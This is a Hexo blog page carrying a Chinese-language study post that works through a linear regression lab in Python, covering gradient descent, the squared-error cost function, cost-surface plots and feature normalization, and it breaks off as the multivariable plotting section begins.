<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/7/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/05/Machine-Learning-Lab1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/05/Machine-Learning-Lab1/" class="post-title-link" itemprop="url">Machine-Learning-Lab1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-05 22:03:26" itemprop="dateCreated datePublished" datetime="2022-05-05T22:03:26+08:00">2022-05-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-08 18:36:19" itemprop="dateModified" datetime="2022-05-08T18:36:19+08:00">2022-05-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现线性回归，并了解它的工作原理</p>
<p>实验文件：</p>
<ul>
<li>ex1.m - Octave/MATLAB脚本，帮助您完成练习</li>
<li>ex1 multi.m - 多个 Octave/MATLAB 脚本，用于练习的后续部分</li>
<li>ex1data1.txt - txt-单变量线性回归数据集</li>
<li>ex1data2.txt - txt-多变量线性回归数据集</li>
<li>submit.m - 将您的解决方案发送到我们的服务器</li>
<li>[?] warmUpExercise.m - Octave/MATLAB中的简单示例函数</li>
<li>[?] plotData.m - 用来显示数据集的函数</li>
<li>[?] computeCost.m - 用来计算线性回归的成本的函数</li>
<li>[?] gradientDescent.m - 用来运行梯度下降的函数</li>
<li>[†] computeCostMulti.m - 多变量代价函数</li>
<li>[†] gradientDescentMulti.m - 多变量梯度下降</li>
<li>[†] featureNormalize.m - 用于规范化特征的函数</li>
<li>[†] normalEqn.m - 用于计算正规方程组的函数</li>
</ul>
<p>在整个练习中，您将使用 ex1.m 和 ex1 multi.m，这些脚本为问题设置数据集，并调用将要编写的函数，您不需要修改它们中的任何一个，您只需按照本任务中的说明修改其他文件中的函数</p>
<p>对于这个编程练习，您只需要完成练习的第一部分，就可以使用一个变量实现线性回归，练习的第二部分是可选的，内容包括使用多变量</p>
<p>PS：由于本人不会使用 Octave，以下实验是在 github 上找的 python 版本</p>
<h2 id="Linear-regression-with-one-variable（单变量线性回归）"><a href="#Linear-regression-with-one-variable（单变量线性回归）" class="headerlink" title="Linear regression with one variable（单变量线性回归）"></a>Linear regression with one variable（单变量线性回归）</h2><p>在本练习的这一部分中，您将使用一个变量实现线性回归，以预测食品卡车的利润：</p>
<ul>
<li>假设你是一家连锁餐厅的首席执行官，正在考虑在不同的城市开设一家新的分店</li>
<li>这家连锁店在各个城市都有卡车，你可以从这些城市获得利润和人口数据</li>
<li>您希望使用这些数据来帮助您选择下一步要扩展到哪个城市<ul>
<li>文件 ex1data1.txt 包含线性回归问题的数据集（第一列是一个城市的人口，第二列是该城市食品卡车的利润，利润为负值表示亏损）</li>
<li>脚本 ex1.m 已经被设置好你需要加载的这些数据</li>
</ul>
</li>
</ul>
<h2 id="Plotting-the-Data-A（绘制数据）"><a href="#Plotting-the-Data-A（绘制数据）" class="headerlink" title="Plotting the Data A（绘制数据）"></a>Plotting the Data A（绘制数据）</h2><p>在开始任何任务之前，通过可视化来理解数据通常是有用的</p>
<p>对于这个数据集，您可以使用散点图来可视化数据，因为它只有两个属性需要绘制 - 利润和人口（你在现实生活中会遇到的许多其他问题都是多维的，无法绘制在二维图上）</p>
<ul>
<li>在 ex1.m 中，数据集从数据文件加载到了变量X和Y中：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment"># as相当于加了一个别称(这个类不用实例化)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 1.载入数据和绘制散点图 ========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;读取数据，并绘制散点图...\n&#x27;</span>)</span><br><span class="line">filepath = <span class="string">r&#x27;data\ex1data1.txt&#x27;</span></span><br><span class="line"><span class="comment"># 从文件中读取数据,第一列是城市的人口,第二列是该城市食品卡车的利润,中间用&#x27;,&#x27;作为分隔符</span></span><br><span class="line">dataset = np.loadtxt(filepath, delimiter=<span class="string">&#x27;,&#x27;</span>, usecols=(<span class="number">0</span>,<span class="number">1</span>)) </span><br><span class="line"><span class="comment"># filepath: 文件路径</span></span><br><span class="line"><span class="comment"># delimiter: 分隔符</span></span><br><span class="line"><span class="comment"># usecols: 选取数据的列编号</span></span><br><span class="line">Xdata = dataset[:,<span class="number">0</span>] <span class="comment"># 获取第一列的数据-城市的人口(因)</span></span><br><span class="line">Ydata = dataset[:,<span class="number">1</span>] <span class="comment"># 获取第二列的数据-卡车的利润(果)</span></span><br><span class="line">plt.figure(<span class="number">0</span>) <span class="comment"># 初始化图表(命名其为&quot;0&quot;)</span></span><br><span class="line">plt.scatter(Xdata,Ydata,c=<span class="string">&#x27;red&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>,s=<span class="number">20</span>) <span class="comment"># 设置图表上的断点</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Population of City in 10,000s&#x27;</span>,fontsize=<span class="number">10</span>) <span class="comment"># 设置x轴上的文字</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Profit of City in $10,000&#x27;</span>,fontsize=<span class="number">10</span>) <span class="comment"># 设置y轴上的文字</span></span><br><span class="line">plt.legend([<span class="string">&#x27;Data Point&#x27;</span>]) <span class="comment"># 设置左上角的注释</span></span><br><span class="line">plt.show() <span class="comment"># 显示该图表</span></span><br></pre></td></tr></table></figure>
<ul>
<li>loadtxt(filepath , delimiter , usecols)：从文件路径 filepath 中读取第 usecols 列的数据，以 delimiter 为数据之间的间隔</li>
</ul>
<p>这里使用了 Matplotlib Pyplot 模块（Pyplot 是常用的绘图模块，能很方便让用户绘制 2D 图表）</p>
<img src="/2022/05/05/Machine-Learning-Lab1/1651680796631-1652006179447.png" class width="1651680796631"> 
<p><strong>Gradient Descent（梯度下降）</strong></p>
<ul>
<li>算法原理：</li>
</ul>
<script type="math/tex; mode=display">
repeat\,\,\, until\,\,\, convergence\{ 
\\
θ_j:=θ_j-\alpha\frac∂{∂θ_j}J(θ_0,θ_1)\quad(for\,\,\,j=0\,\,\,and\,\,\,j=1)
\\
\}</script><ul>
<li>代码实现：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> computeCost <span class="keyword">import</span> compute_cost</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span>(<span class="params">X,Y,theta_init,alpha,iter_num</span>):</span></span><br><span class="line">    <span class="comment"># X: 城市的人口(添加有偏置维度)</span></span><br><span class="line">    <span class="comment"># Y: 卡车的利润</span></span><br><span class="line">    <span class="comment"># theta_init: 参数θ(初始值)</span></span><br><span class="line">    <span class="comment"># alpha: 学习率α</span></span><br><span class="line">    <span class="comment"># iter_num: 迭代次数iter</span></span><br><span class="line">    m = Y.shape[<span class="number">0</span>] </span><br><span class="line">    J_history = np.zeros(iter_num) <span class="comment"># 用于记录代价的历史值</span></span><br><span class="line">    theta = theta_init</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,iter_num): </span><br><span class="line">        J_history[num] = compute_cost(X,Y,theta) <span class="comment"># 用代价函数计算代价并记录</span></span><br><span class="line">        hyp = np.dot(X,np.transpose(theta))</span><br><span class="line">        theta = theta - alpha * np.dot(np.transpose(hyp -Y),X) / m </span><br><span class="line">    <span class="keyword">return</span> theta,J_history <span class="comment"># 返回&quot;参数θ(已改变)&quot;和&quot;代价的历史值&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>zeros()：返回来一个给定形状和类型的，用“0”填充的数组</li>
<li>shape()：它的功能是读取矩阵的长度，比如 “shape[0]” 就是读取矩阵第一维度的长度</li>
</ul>
<p><strong>Mean squared error（代价函数-均方误差）</strong></p>
<ul>
<li>算法原理：</li>
</ul>
<script type="math/tex; mode=display">
J(θ_0,θ_1)=
\frac1{2m}\sum_{i=1}^m(\hat y^{(i)}−y^{(i)})^2=
\frac1{2m}\sum_{i=1}^m(h_θ(x^{(i)})−y^{(i)})^2</script><ul>
<li>代码实现：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_cost</span>(<span class="params">X,Y,theta</span>):</span></span><br><span class="line">    <span class="comment"># X: 城市的人口(添加有偏置维度)</span></span><br><span class="line">    <span class="comment"># Y: 卡车的利润</span></span><br><span class="line">    <span class="comment"># theta: 参数θ(已改变)</span></span><br><span class="line">	hypthesis = np.dot(X,np.transpose(theta))</span><br><span class="line">	cost = np.dot(np.transpose(hypthesis - Y),(hypthesis -Y))</span><br><span class="line">	cost = cost / (<span class="number">2</span> * X.shape[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> cost</span><br></pre></td></tr></table></figure>
<ul>
<li>dot(x , y)：两个数组作矩阵乘积，当两个数组的维度不能直接进行矩阵乘法时，dot会把尝试后面的参数进行转置</li>
<li>transpose(x)：把矩阵进行转置</li>
</ul>
<p><strong>Completion process（具体的拟合过程）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 2.计算代价和梯度 ========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;进行梯度计算...\n&#x27;</span>)</span><br><span class="line">X = np.c_[np.ones(Xdata.shape[<span class="number">0</span>]),Xdata] <span class="comment"># 给输入数据Xdata增加一个偏置维度</span></span><br><span class="line">Y = Ydata</span><br><span class="line">theta_init = np.zeros(X.shape[<span class="number">1</span>]) <span class="comment"># 初始化(θ,参数)</span></span><br><span class="line">iter_num = <span class="number">1500</span> <span class="comment"># 初始化(iter,迭代次数)</span></span><br><span class="line">alpha = <span class="number">0.01</span> <span class="comment"># 初始化(α,学习率)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Initial cost:&#x27;</span>, <span class="built_in">str</span>(compute_cost(X,Y,theta_init)), <span class="string">&#x27;\nThis value should be 32.07&#x27;</span>) <span class="comment"># 利用代价函数计算初始代价</span></span><br><span class="line">theta_fin,J_history = gradient_descent(X,Y,theta_init,alpha,iter_num) <span class="comment"># 利用梯度下降法进行优化求解,返回记录代价历史值的J_history,和最终θ(theta_fin)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Theta found by gradient descent:&#x27;</span>,<span class="built_in">str</span>(theta_fin.reshape(<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制数据散点图和线性回归曲线</span></span><br><span class="line">plt.figure(<span class="number">1</span>)</span><br><span class="line">plt.scatter(Xdata,Ydata,c=<span class="string">&#x27;red&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>,s=<span class="number">20</span>)</span><br><span class="line">plt.plot(X[:,<span class="number">1</span>],np.dot(X,theta_fin),<span class="string">&#x27;b-&#x27;</span>,lw=<span class="number">3</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Population of City in 10,000s&#x27;</span>,fontsize=<span class="number">10</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Profit of City in $10,000&#x27;</span>,fontsize=<span class="number">10</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;Data Point&#x27;</span>,<span class="string">&#x27;Linear Regression&#x27;</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<ul>
<li><p>ones(shape  ,  dtype=None  ,  order=’C’)：返回给定形状和数据类型的新数组</p>
</li>
<li><p>c_[ x , y ]：按列叠加两个矩阵，把两个矩阵左右组合，要求行数相等</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x_1 = </span><br><span class="line"> [[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">  [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]]</span><br><span class="line">x_2 = </span><br><span class="line"> [[<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line">  [<span class="number">8</span> <span class="number">9</span> <span class="number">6</span>]]</span><br><span class="line">x_new = </span><br><span class="line"> [[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line">  [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span> <span class="number">6</span>]]</span><br></pre></td></tr></table></figure>
<img src="/2022/05/05/Machine-Learning-Lab1/1651746868359-1652006179447.png" class width="1651746868359"> 
<h2 id="Visualizing-J-θ-（可视化代价函数的执行过程）"><a href="#Visualizing-J-θ-（可视化代价函数的执行过程）" class="headerlink" title="Visualizing J(θ)（可视化代价函数的执行过程）"></a>Visualizing J(θ)（可视化代价函数的执行过程）</h2><p>为了更好地理解代价函数 J（θ），我们将生成 J（θ）的曲面和等高线图</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line"><span class="keyword">from</span> matplotlib.colors <span class="keyword">import</span> LogNorm</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 3.可视化代价J(theta0,theta1) ========</span></span><br><span class="line">theta0_vals = np.linspace(-<span class="number">10</span>,<span class="number">10</span>,<span class="number">100</span>) <span class="comment"># xs的每一行都是theta0_vals的复制</span></span><br><span class="line">theta1_vals = np.linspace(-<span class="number">1</span>,<span class="number">4</span>,<span class="number">100</span>) <span class="comment"># ys的每一列都是theta1_vals的复制</span></span><br><span class="line">xs,ys = np.meshgrid(theta0_vals,theta1_vals) <span class="comment"># 生成网格点坐标矩阵</span></span><br><span class="line">J_vals = np.zeros(xs.shape)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,theta0_vals.size):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,theta1_vals.size):</span><br><span class="line">		t = np.array([theta0_vals[i],theta1_vals[j]])</span><br><span class="line">		J_vals[i][j] = compute_cost(X,Y,t)</span><br><span class="line">J_vals = np.transpose(J_vals)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制3D曲面图</span></span><br><span class="line">figure = plt.figure(<span class="number">2</span>)</span><br><span class="line">ax = Axes3D(figure) <span class="comment"># 把图像指定为3D视图</span></span><br><span class="line">ax.plot_surface(xs,ys,J_vals,cmap=<span class="string">&#x27;rainbow&#x27;</span>) <span class="comment"># 指定图形的色彩(彩虹色)</span></span><br><span class="line">plt.xlabel(<span class="string">r&#x27;$\theta_0$&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">r&#x27;$\theta_1$&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制代价的等高椭圆线</span></span><br><span class="line">plt.figure(<span class="number">3</span>)</span><br><span class="line">lvls = np.logspace(-<span class="number">2</span>, <span class="number">3</span>, <span class="number">20</span>)</span><br><span class="line">plt.contour(xs, ys, J_vals, levels=lvls, norm = LogNorm()) <span class="comment"># 设置坐标和值,指定等高线的值,指定色彩</span></span><br><span class="line">plt.plot(theta_fin[<span class="number">0</span>], theta_fin[<span class="number">1</span>], <span class="string">&#x27;ro&#x27;</span>,markersize =<span class="number">6</span>) <span class="comment"># 设置图像中的那个红点</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<ul>
<li>linspace(start , stop , num=50 , endpoint=True , retstep=False , dtype=None)：用于在线性空间中以均匀步长生成数字序列</li>
<li>meshgrid(theta0_vals , theta0_vals)：生成坐标矩阵</li>
<li>array(A , B , …. )：创建一个数组（参数有几个就是几维）</li>
<li>logspace(start , stop , num=50 , endpoint=True , base=10.0)：把范围是 “[base的start次方,base的stop次方]” 的数据，在对数尺度上返回间隔均匀的数字（有点看不懂）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.logspace(<span class="number">2.0</span>, <span class="number">3.0</span>, num=<span class="number">4</span>)</span><br><span class="line">array([ <span class="number">100.</span>        ,  <span class="number">215.443469</span>  ,  <span class="number">464.15888336</span>, <span class="number">1000.</span>        ])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.logspace(<span class="number">2.0</span>, <span class="number">3.0</span>, num=<span class="number">4</span>, endpoint=<span class="literal">False</span>) <span class="comment"># endpoint:停止时是否是最后一个样本</span></span><br><span class="line">array([<span class="number">100.</span>        ,  <span class="number">177.827941</span>  ,  <span class="number">316.22776602</span>,  <span class="number">562.34132519</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.logspace(<span class="number">2.0</span>, <span class="number">3.0</span>, num=<span class="number">4</span>, base=<span class="number">2.0</span>)</span><br><span class="line">array([<span class="number">4.</span>        ,  <span class="number">5.0396842</span> ,  <span class="number">6.34960421</span>,  <span class="number">8.</span>        ])</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<img src="/2022/05/05/Machine-Learning-Lab1/1651750210936-1652006179448.png" class width="1651750210936"> 
<img src="/2022/05/05/Machine-Learning-Lab1/1651750220564-1652006179448.png" class width="1651750220564"> 
<h2 id="Linear-regression-with-multiple-variables（多元线性回归）"><a href="#Linear-regression-with-multiple-variables（多元线性回归）" class="headerlink" title="Linear regression with multiple variables（多元线性回归）"></a>Linear regression with multiple variables（多元线性回归）</h2><p>在这一部分中，您将使用多变量线性回归来预测房价：</p>
<ul>
<li>假设你要卖房子，你想知道一个好的市场价格是多少</li>
<li>一种方法是首先收集最近售出房屋的信息，并制作一个房价模型<ul>
<li>文件 ex1data2.txt 包含 Portland 房价的培训数据集（第一栏是房子的大小，第二栏是卧室的数量，第三栏是房子的价格）</li>
<li>脚本 ex1_multi.m 已设置脚本以帮助您逐步完成此练习</li>
</ul>
</li>
</ul>
<h2 id="Feature-Normalization（特征规范化）"><a href="#Feature-Normalization（特征规范化）" class="headerlink" title="Feature Normalization（特征规范化）"></a>Feature Normalization（特征规范化）</h2><p>脚本 ex1_multi.m 首先加载并显示此数据集中的一些值，通过查看这些值，注意到：房屋大小大约是卧室数量的1000倍</p>
<p>当特征相差几个数量级时，首先执行特征缩放可以使梯度下降更快地收敛</p>
<p>Feature Normalization 的原理</p>
<ul>
<li>从数据集中减去每个特征的平均值</li>
<li>减去平均值后，再将特征值按各自的“标准偏差”进行缩放（除）</li>
</ul>
<p>Feature Normalization 代码实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">feature_normalize</span>(<span class="params">Xdata</span>):</span></span><br><span class="line">	X_mean = np.mean(Xdata,axis=<span class="number">0</span>)</span><br><span class="line">	X_std = np.std(Xdata,axis=<span class="number">0</span>)</span><br><span class="line">	X_norm = np.divide(np.subtract(Xdata,X_mean),X_std)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> X_norm,X_mean,X_std</span><br></pre></td></tr></table></figure>
<ul>
<li>mean(A , axis=0)：计算每一维度的均值</li>
<li>std(A , axis=0)：计算沿指定轴的标准差</li>
<li>divide(A , B)：数组对应位置元素进行除法</li>
<li>subtract(A , B)：数组对应位置元素进行减法</li>
</ul>
<p><strong>Completion process（具体过程）</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ======== 1.读取数据并标准化数据的特征 ========</span></span><br><span class="line">data = np.loadtxt(<span class="string">r&#x27;data\ex1data2.txt&#x27;</span>,delimiter =<span class="string">&#x27;,&#x27;</span>) <span class="comment"># 从文件中读取数据,中间用&#x27;,&#x27;作为分隔符(第一栏是房子的大小，第二栏是卧室的数量，第三栏是房子的价格)</span></span><br><span class="line">Xdata = data[:,<span class="number">0</span>:<span class="number">2</span>] <span class="comment"># 房子的大小&amp;卧室的数量(因)</span></span><br><span class="line">Ydata = data[:,<span class="number">2</span>] <span class="comment"># 房子的价格(果)</span></span><br><span class="line">X,mu,sigma = feature_normalize(Xdata) <span class="comment"># 对输入数据特征进行标准化</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Mu is:&#x27;</span>,mu)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Sigma is:&#x27;</span>,sigma)</span><br><span class="line">X = np.c_[np.ones(X.shape[<span class="number">0</span>]),X] <span class="comment"># 给输入数据Xdata增加一个偏置维度</span></span><br><span class="line">Y = Ydata</span><br></pre></td></tr></table></figure>
<h2 id="Plotting-the-Data-B（绘制数据）"><a href="#Plotting-the-Data-B（绘制数据）" class="headerlink" title="Plotting the Data B（绘制数据）"></a>Plotting the Data B（绘制数据）</h2><p>这一部分我们需要绘制反应 “迭代次数和代价函数值关系” 的图形，还是使用梯度下降法求解：</p>
